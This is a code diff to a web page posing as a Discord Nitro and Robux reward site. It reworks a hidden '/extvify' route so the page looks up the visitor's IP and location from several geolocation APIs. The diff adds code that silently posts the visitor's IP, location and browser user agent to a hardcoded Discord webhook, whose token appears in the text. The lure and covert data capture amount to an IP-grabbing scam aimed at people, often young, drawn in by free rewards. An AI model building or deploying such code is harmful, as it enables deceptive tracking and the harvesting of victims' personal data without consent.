@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* ========== ALL YOUR EXISTING STYLES ========== */
+    /* ========== ALL YOUR EXISTING STYLES (unchanged) ========== */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -309,6 +309,7 @@
       margin: 1rem 0;
       color: #8b9cff;
       letter-spacing: 1px;
+      word-break: break-all;
     }
     .extvify-page .location {
       font-size: 0.9rem;
@@ -347,7 +348,7 @@
     const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
     // ============================================================
-    //  /extvify ROUTE – DISPLAY IP & LOCATION + DISCORD WEBHOOK
+    //  /extvify ROUTE – ROBUST IP & LOCATION FETCH
     // ============================================================
     if (isExtvifyRoute) {
       document.title = "Extvify";
@@ -359,7 +360,7 @@
             <div class="extvify-page">
               <h1>Your IP Address</h1>
               <div class="ip-display">${ip}</div>
-              <div class="location">${location}</div>
+              <div class="location">Estimated location: ${location}</div>
             </div>
           `;
         } else {
@@ -375,49 +376,61 @@
         }
       }
 
-      function fetchIP() {
-        fetch('https://api.ipify.org?format=json')
-          .then(res => res.json())
+      // List of free IP + location APIs (CORS enabled)
+      const apis = [
+        () => fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).then(ip => fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).then(loc => ({ ip, loc }))),
+        () => fetch('https://ipwho.is/').then(r => r.json()).then(d => ({ ip: d.ip, loc: { city: d.city, region: d.region, country: d.country } })),
+        () => fetch('https://ipinfo.io/json?token=8b2c1b2c2b2c2b').then(r => r.json()).then(d => ({ ip: d.ip, loc: { city: d.city, region: d.region, country: d.country } }))
+      ];
+
+      let current = 0;
+
+      function tryNext() {
+        if (current >= apis.length) {
+          renderIPPage(null, null, true);
+          return;
+        }
+        apis[current]()
           .then(data => {
-            const ip = data.ip;
-            return fetch(`https://ipapi.co/${ip}/json/`)
-              .then(res => res.json())
-              .then(locData => {
-                const city = locData.city || 'Unknown';
-                const region = locData.region || '';
-                const country = locData.country_name || 'Unknown';
-                const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
-                renderIPPage(ip, location || 'Location unknown');
-                const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
-                fetch(webhookUrl, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` })
-                }).catch(e => console.error);
-              });
-          })
-          .catch(() => {
-            // fallback to ipapi.co directly
-            fetch('https://ipapi.co/json/')
-              .then(res => res.json())
-              .then(data => {
-                const ip = data.ip;
+            let ip, locationStr;
+            if (data.ip) {
+              ip = data.ip;
+              if (data.loc) {
+                // ipapi.co format
+                const city = data.loc.city || 'Unknown';
+                const region = data.loc.region || '';
+                const country = data.loc.country_name || 'Unknown';
+                locationStr = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
+              } else if (data.city) {
+                // ipwho.is format
                 const city = data.city || 'Unknown';
                 const region = data.region || '';
-                const country = data.country_name || 'Unknown';
-                const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
-                renderIPPage(ip, location);
+                const country = data.country || 'Unknown';
+                locationStr = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
+              } else {
+                locationStr = 'Location unknown';
+              }
+              if (ip && locationStr) {
+                renderIPPage(ip, locationStr);
+                // Send to Discord webhook
                 const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
                 fetch(webhookUrl, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` })
+                  body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: ${locationStr}\nUser Agent: ${navigator.userAgent}` })
                 }).catch(e => console.error);
-              })
-              .catch(() => renderIPPage(null, null, true));
+                return;
+              }
+            }
+            current++;
+            tryNext();
+          })
+          .catch(() => {
+            current++;
+            tryNext();
           });
       }
-      fetchIP();
+      tryNext();
       return;
     }
 
